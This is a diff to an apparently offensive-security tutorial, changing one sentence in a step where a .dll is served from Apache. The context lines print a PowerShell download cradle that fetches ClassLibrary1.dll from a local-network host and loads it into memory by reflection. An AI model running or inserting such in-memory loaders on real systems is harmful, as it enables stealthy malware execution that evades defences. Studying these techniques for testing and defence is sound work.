@@ -30,7 +30,7 @@ Now we have the .dll, we can host it in a remote server or ourselves with the co
 
         service apache start
 
-Now we just need to execute the .dll in memory, so we do a .ps1 script to do that (download_cradle.ps1, also this needs to be placed in /var/www/html):
+Now we just need to execute the .dll in memory, so we do a .ps1 script to do that, we can name it *download_cradle.ps1* also also this needs to be placed in /var/www/html:
 
         $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')
         $assem = [System.Reflection.Assembly]::Load($data)
